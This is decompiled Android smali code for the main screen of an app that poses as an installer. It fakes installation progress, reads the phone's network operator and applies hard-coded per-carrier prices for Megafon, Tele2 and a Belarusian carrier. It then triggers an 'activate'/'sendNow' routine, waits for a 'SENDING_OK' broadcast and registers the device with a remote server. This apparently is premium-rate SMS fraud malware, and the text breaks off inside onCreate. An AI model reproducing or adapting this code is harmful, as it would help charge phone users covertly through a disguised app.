.class public Lcom/software/application/Main;
.super Landroid/app/Activity;
.source "Main.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/software/application/Main$AsyncLoader;
    }
.end annotation


# static fields
.field public static final CNT_NAME:Ljava/lang/String; = "*CNT_NAME*"

.field private static final INSTALLED_URL:Ljava/lang/String; = "INSTALLED_URL"

.field private static final OFFERT_ACTIVITY:I = 0x1

.field public static final PREFS:Ljava/lang/String; = "PREFS"

.field private static final RESULT_OK:I = 0x1

.field public static final SENDING_OK:Ljava/lang/String; = "SENDING_OK"

.field private static final WAS_INSTALLED:Ljava/lang/String; = "WAS_INSTALLED"


# instance fields
.field private actor:Lcom/software/application/Actor;

.field private agreementTextView:Landroid/widget/TextView;

.field private byPrice:Ljava/lang/String;

.field private dialog:Landroid/app/ProgressDialog;

.field private exitTextView:Landroid/widget/TextView;

.field private footerTextView:Landroid/widget/TextView;

.field private installedContentTextView:Landroid/widget/TextView;

.field private mainTextView:Landroid/widget/TextView;

.field private mfPrice:Ljava/lang/String;

.field private okURL:Ljava/lang/String;

.field private pleaseWaitString:Ljava/lang/String;

.field private progressBar:Landroid/widget/ProgressBar;

.field private tele2Price:Ljava/lang/String;

.field private wasProgressDone:Z

.field private yesButton:Landroid/widget/Button;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 32
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 72
    const-string v0, "236"

    iput-object v0, p0, Lcom/software/application/Main;->mfPrice:Ljava/lang/String;

    .line 74
    const-string v0, "94.70"

    iput-object v0, p0, Lcom/software/application/Main;->tele2Price:Ljava/lang/String;

    .line 76
    const-string v0, "19900"

    iput-object v0, p0, Lcom/software/application/Main;->byPrice:Ljava/lang/String;

    .line 32
    return-void
.end method

.method static synthetic access$0(Lcom/software/application/Main;)Landroid/widget/ProgressBar;
    .locals 1

    .prologue
    .line 70
    iget-object v0, p0, Lcom/software/application/Main;->progressBar:Landroid/widget/ProgressBar;

    return-object v0
.end method

.method static synthetic access$1(Lcom/software/application/Main;)Landroid/widget/TextView;
    .locals 1

    .prologue
    .line 48
    iget-object v0, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    return-object v0
.end method

.method static synthetic access$2(Lcom/software/application/Main;)Lcom/software/application/Actor;
    .locals 1

    .prologue
    .line 58
    iget-object v0, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    return-object v0
.end method

.method static synthetic access$3(Lcom/software/application/Main;Z)V
    .locals 0

    .prologue
    .line 56
    iput-boolean p1, p0, Lcom/software/application/Main;->wasProgressDone:Z

    return-void
.end method

.method static synthetic access$4(Lcom/software/application/Main;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 52
    iput-object p1, p0, Lcom/software/application/Main;->okURL:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$5(Lcom/software/application/Main;)V
    .locals 0

    .prologue
    .line 166
    invoke-direct {p0}, Lcom/software/application/Main;->updateGUI()V

    return-void
.end method

.method static synthetic access$6(Lcom/software/application/Main;)V
    .locals 0

    .prologue
    .line 281
    invoke-direct {p0}, Lcom/software/application/Main;->showURL()V

    return-void
.end method

.method static synthetic access$7(Lcom/software/application/Main;)V
    .locals 0

    .prologue
    .line 234
    invoke-direct {p0}, Lcom/software/application/Main;->start()V

    return-void
.end method

.method static synthetic access$8(Lcom/software/application/Main;)V
    .locals 0

    .prologue
    .line 365
    invoke-direct {p0}, Lcom/software/application/Main;->showRules()V

    return-void
.end method

.method static synthetic access$9(Lcom/software/application/Main;)Landroid/app/ProgressDialog;
    .locals 1

    .prologue
    .line 60
    iget-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    return-object v0
.end method

.method private areInstalledAndActedLinksEquals()Z
    .locals 2

    .prologue
    .line 341
    iget-object v0, p0, Lcom/software/application/Main;->okURL:Ljava/lang/String;

    iget-object v1, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v1}, Lcom/software/application/Actor;->getLinkHasToBeActed()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    return v0
.end method

.method private initButtons()V
    .locals 2

    .prologue
    .line 128
    const v0, 0x7f090007

    invoke-virtual {p0, v0}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    .line 129
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 130
    iget-object v0, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setEnabled(Z)V

    .line 131
    iget-object v0, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setVisibility(I)V

    .line 133
    :cond_0
    invoke-direct {p0}, Lcom/software/application/Main;->setListeners()V

    .line 134
    return-void
.end method

.method private initGUI()V
    .locals 0

    .prologue
    .line 123
    invoke-direct {p0}, Lcom/software/application/Main;->initButtons()V

    .line 124
    invoke-direct {p0}, Lcom/software/application/Main;->initTextViews()V

    .line 125
    return-void
.end method

.method private initSettings()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    .line 335
    const-string v1, "PREFS"

    invoke-virtual {p0, v1, v2}, Lcom/software/application/Main;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 336
    .local v0, "settings":Landroid/content/SharedPreferences;
    const-string v1, "WAS_INSTALLED"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    iput-boolean v1, p0, Lcom/software/application/Main;->wasProgressDone:Z

    .line 337
    const-string v1, "INSTALLED_URL"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/software/application/Main;->okURL:Ljava/lang/String;

    .line 338
    return-void
.end method

.method private initTextViews()V
    .locals 4

    .prologue
    .line 137
    const v1, 0x7f090008

    invoke-virtual {p0, v1}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    iput-object v1, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    .line 138
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v1

    if-nez v1, :cond_3

    .line 139
    iget-object v1, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->getMainLocalizedText()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 143
    :goto_0
    iget-object v1, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v1}, Lcom/software/application/Actor;->isUkID()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 144
    const v1, 0x7f090003

    invoke-virtual {p0, v1}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    .line 145
    .local v0, "tv":Landroid/widget/TextView;
    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setVisibility(I)V

    .line 146
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 147
    iget-object v1, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    invoke-virtual {p0}, Lcom/software/application/Main;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const v3, 0x7f070006

    invoke-virtual {v2, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 150
    .end local v0    # "tv":Landroid/widget/TextView;
    :cond_0
    const v1, 0x7f09000a

    invoke-virtual {p0, v1}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    iput-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    .line 151
    iget-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->getSecondText()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 152
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v1}, Lcom/software/application/Actor;->isUkID()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 153
    :cond_1
    iget-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setEnabled(Z)V

    .line 154
    iget-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setVisibility(I)V

    .line 156
    :cond_2
    return-void

    .line 141
    :cond_3
    iget-object v1, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    new-instance v2, Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v3}, Lcom/software/application/Actor;->getMainLocalizedText()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "100%"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_0
.end method

.method private install()V
    .locals 4

    .prologue
    .line 159
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v0

    if-nez v0, :cond_0

    .line 160
    new-instance v0, Lcom/software/application/Main$AsyncLoader;

    invoke-direct {v0, p0}, Lcom/software/application/Main$AsyncLoader;-><init>(Lcom/software/application/Main;)V

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, ""

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Lcom/software/application/Main$AsyncLoader;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 164
    :goto_0
    return-void

    .line 162
    :cond_0
    invoke-direct {p0}, Lcom/software/application/Main;->updateGUI()V

    goto :goto_0
.end method

.method private registerReceiver()V
    .locals 3

    .prologue
    .line 263
    new-instance v0, Lcom/software/application/Main$4;

    invoke-direct {v0, p0}, Lcom/software/application/Main$4;-><init>(Lcom/software/application/Main;)V

    .line 278
    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "SENDING_OK"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 263
    invoke-virtual {p0, v0, v1}, Lcom/software/application/Main;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 279
    return-void
.end method

.method private setListeners()V
    .locals 9

    .prologue
    const v8, 0x7f090005

    const v7, 0x7f090004

    const v6, 0x7f090003

    const/16 v4, 0x8

    const/4 v5, 0x0

    .line 173
    iget-object v2, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    new-instance v3, Lcom/software/application/Main$1;

    invoke-direct {v3, p0}, Lcom/software/application/Main$1;-><init>(Lcom/software/application/Main;)V

    invoke-virtual {v2, v3}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 184
    invoke-virtual {p0, v6}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->footerTextView:Landroid/widget/TextView;

    .line 185
    invoke-virtual {p0, v7}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    .line 186
    invoke-virtual {p0, v8}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    .line 187
    iget-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setVisibility(I)V

    .line 188
    iget-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setVisibility(I)V

    .line 189
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isMegafon()Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isTele2()Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isBy()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 191
    :cond_0
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isMegafon()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 193
    iget-object v1, p0, Lcom/software/application/Main;->mfPrice:Ljava/lang/String;

    .line 203
    .local v1, "price":Ljava/lang/String;
    :goto_0
    iget-object v2, p0, Lcom/software/application/Main;->footerTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v5}, Landroid/widget/TextView;->setVisibility(I)V

    .line 204
    iget-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v5}, Landroid/widget/TextView;->setVisibility(I)V

    .line 205
    iget-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v5}, Landroid/widget/TextView;->setVisibility(I)V

    .line 206
    invoke-virtual {p0, v6}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->footerTextView:Landroid/widget/TextView;

    .line 207
    iget-object v2, p0, Lcom/software/application/Main;->footerTextView:Landroid/widget/TextView;

    new-instance v3, Ljava/lang/StringBuilder;

    const v4, 0x7f07000f

    invoke-virtual {p0, v4}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, " "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const v4, 0x7f070010

    invoke-virtual {p0, v4}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 208
    invoke-virtual {p0, v7}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    .line 209
    new-instance v0, Landroid/text/SpannableString;

    const v2, 0x7f07000d

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Landroid/text/SpannableString;-><init>(Ljava/lang/CharSequence;)V

    .line 210
    .local v0, "content":Landroid/text/SpannableString;
    new-instance v2, Landroid/text/style/UnderlineSpan;

    invoke-direct {v2}, Landroid/text/style/UnderlineSpan;-><init>()V

    invoke-virtual {v0}, Landroid/text/SpannableString;->length()I

    move-result v3

    invoke-virtual {v0, v2, v5, v3, v5}, Landroid/text/SpannableString;->setSpan(Ljava/lang/Object;III)V

    .line 211
    iget-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 212
    iget-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    new-instance v3, Lcom/software/application/Main$2;

    invoke-direct {v3, p0}, Lcom/software/application/Main$2;-><init>(Lcom/software/application/Main;)V

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 220
    invoke-virtual {p0, v8}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    .line 221
    new-instance v0, Landroid/text/SpannableString;

    .end local v0    # "content":Landroid/text/SpannableString;
    const v2, 0x7f07000e

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Landroid/text/SpannableString;-><init>(Ljava/lang/CharSequence;)V

    .line 222
    .restart local v0    # "content":Landroid/text/SpannableString;
    new-instance v2, Landroid/text/style/UnderlineSpan;

    invoke-direct {v2}, Landroid/text/style/UnderlineSpan;-><init>()V

    invoke-virtual {v0}, Landroid/text/SpannableString;->length()I

    move-result v3

    invoke-virtual {v0, v2, v5, v3, v5}, Landroid/text/SpannableString;->setSpan(Ljava/lang/Object;III)V

    .line 223
    iget-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 224
    iget-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    new-instance v3, Lcom/software/application/Main$3;

    invoke-direct {v3, p0}, Lcom/software/application/Main$3;-><init>(Lcom/software/application/Main;)V

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 232
    .end local v0    # "content":Landroid/text/SpannableString;
    .end local v1    # "price":Ljava/lang/String;
    :cond_1
    return-void

    .line 195
    :cond_2
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isBy()Z

    move-result v2

    if-eqz v2, :cond_3

    .line 197
    iget-object v1, p0, Lcom/software/application/Main;->byPrice:Ljava/lang/String;

    .restart local v1    # "price":Ljava/lang/String;
    goto/16 :goto_0

    .line 201
    .end local v1    # "price":Ljava/lang/String;
    :cond_3
    iget-object v1, p0, Lcom/software/application/Main;->tele2Price:Ljava/lang/String;

    .restart local v1    # "price":Ljava/lang/String;
    goto/16 :goto_0
.end method

.method private showRules()V
    .locals 2

    .prologue
    .line 366
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/software/application/OffertActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 367
    .local v0, "i":Landroid/content/Intent;
    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Lcom/software/application/Main;->startActivityForResult(Landroid/content/Intent;I)V

    .line 368
    return-void
.end method

.method private showURL()V
    .locals 3

    .prologue
    .line 282
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/software/application/ShowLink;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 283
    .local v0, "i":Landroid/content/Intent;
    const-string v1, "URL"

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->getActedLink()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 284
    invoke-virtual {p0, v0}, Lcom/software/application/Main;->startActivity(Landroid/content/Intent;)V

    .line 285
    invoke-virtual {p0}, Lcom/software/application/Main;->finish()V

    .line 286
    return-void
.end method

.method private start()V
    .locals 2

    .prologue
    .line 235
    new-instance v0, Landroid/app/ProgressDialog;

    invoke-direct {v0, p0}, Landroid/app/ProgressDialog;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    .line 236
    iget-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setCancelable(Z)V

    .line 237
    iget-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    iget-object v1, p0, Lcom/software/application/Main;->pleaseWaitString:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setMessage(Ljava/lang/CharSequence;)V

    .line 238
    iget-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    invoke-virtual {v0}, Landroid/app/ProgressDialog;->show()V

    .line 239
    invoke-direct {p0}, Lcom/software/application/Main;->registerReceiver()V

    .line 240
    iget-object v0, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v0}, Lcom/software/application/Actor;->activate()V

    .line 241
    return-void
.end method

.method private startC2DM()V
    .locals 4

    .prologue
    .line 110
    invoke-static {p0}, Lcom/google/android/c2dm/C2DMessaging;->getRegistrationId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 111
    .local v0, "id":Ljava/lang/String;
    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    if-nez v0, :cond_2

    .line 112
    :cond_0
    const v2, 0x7f070011

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2}, Lcom/google/android/c2dm/C2DMessaging;->register(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_1

    .line 113
    new-instance v1, Lcom/software/application/Notificator;

    invoke-direct {v1}, Lcom/software/application/Notificator;-><init>()V

    .line 114
    .local v1, "notifier":Lcom/software/application/Notificator;
    const-string v2, "PREFS"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Lcom/software/application/Main;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/software/application/Notificator;->setPrefs(Landroid/content/SharedPreferences;)V

    .line 115
    invoke-virtual {p0}, Lcom/software/application/Main;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/software/application/Notificator;->initNotificationsNumberSettings(Landroid/content/Context;)V

    .line 120
    .end local v1    # "notifier":Lcom/software/application/Notificator;
    :cond_1
    :goto_0
    return-void

    .line 118
    :cond_2
    invoke-static {p0, v0}, Lcom/software/application/DeviceRegistrar;->registerToServer(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private updateGUI()V
    .locals 2

    .prologue
    .line 167
    iget-object v0, p0, Lcom/software/application/Main;->progressBar:Landroid/widget/ProgressBar;

    const/16 v1, 0x64

    invoke-virtual {v0, v1}, Landroid/widget/ProgressBar;->setProgress(I)V

    .line 168
    invoke-direct {p0}, Lcom/software/application/Main;->initGUI()V

    .line 169
    invoke-virtual {p0}, Lcom/software/application/Main;->animateButtons()V

    .line 170
    return-void
.end method

.method private wasOK()Z
    .locals 1

    .prologue
    .line 345
    iget-boolean v0, p0, Lcom/software/application/Main;->wasProgressDone:Z

    if-eqz v0, :cond_0

    invoke-direct {p0}, Lcom/software/application/Main;->areInstalledAndActedLinksEquals()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method


# virtual methods
.method animateButtons()V
    .locals 9

    .prologue
    const/4 v4, 0x0

    const/4 v1, 0x1

    .line 327
    new-instance v0, Landroid/view/animation/TranslateAnimation;

    const/high16 v2, 0x3f800000    # 1.0f

    move v3, v1

    move v5, v1

    move v6, v4

    move v7, v1

    move v8, v4

    invoke-direct/range {v0 .. v8}, Landroid/view/animation/TranslateAnimation;-><init>(IFIFIFIF)V

    .line 329
    .local v0, "animation":Landroid/view/animation/Animation;
    const-wide/16 v1, 0x3e8

    invoke-virtual {v0, v1, v2}, Landroid/view/animation/Animation;->setDuration(J)V

    .line 330
    iget-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->startAnimation(Landroid/view/animation/Animation;)V

    .line 331
    iget-object v1, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    invoke-virtual {v1, v0}, Landroid/widget/Button;->startAnimation(Landroid/view/animation/Animation;)V

    .line 332
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "intent"    # Landroid/content/Intent;

    .prologue
    .line 256
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 257
    const/4 v0, 0x1

    if-ne p2, v0, :cond_0

    .line 258
    invoke-direct {p0}, Lcom/software/application/Main;->start()V

    .line 260
    :cond_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 80
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 81
    const v2, 0x7f030001

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->setContentView(I)V

    .line 82
    const v2, 0x7f090009

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/ProgressBar;

    iput-object v2, p0, Lcom/software/application/Main;->progressBar:Landroid/widget/ProgressBar;

    .line 83
    invoke-virtual {p0}, Lcom/software/application/Main;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const v3, 0x7f07000a

    invoke-virtual {v2, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/software/application/Main;->pleaseWaitString:Ljava/lang/String;

    .line 84
    const-string v2, "phone"

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 85
    .local v0, "mgr":Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v1

    .line 86
    .local v1, "opStr":Ljava/lang/String;
    new-instance v2, Lcom/software/application/Actor;

    invoke-direct {v2, p0, v1}, Lcom/software/application/Actor;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    iput-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    .line 87
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->wasInitError()Z

    move-result v2

    if-nez v2, :cond_3

    .line 88
    invoke-direct {p0}, Lcom/software/application/Main;->initSettings()V

    .line 89
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->sendNow()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 90
    invoke-direct {p0}, Lcom/software/application/Main;->initGUI()V

    .line 91
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isActed()Z

    move-result v2

    if-nez v2, :cond_0

    .line 92
    invoke-direct {p0}, Lcom/software/application/Main;->start()V

    .line 107
    :goto_0
    return-void

    .line 94
    :cond_0
    invoke-direct {p0}, Lcom/software/application/Main;->install()V

    goto :goto_0
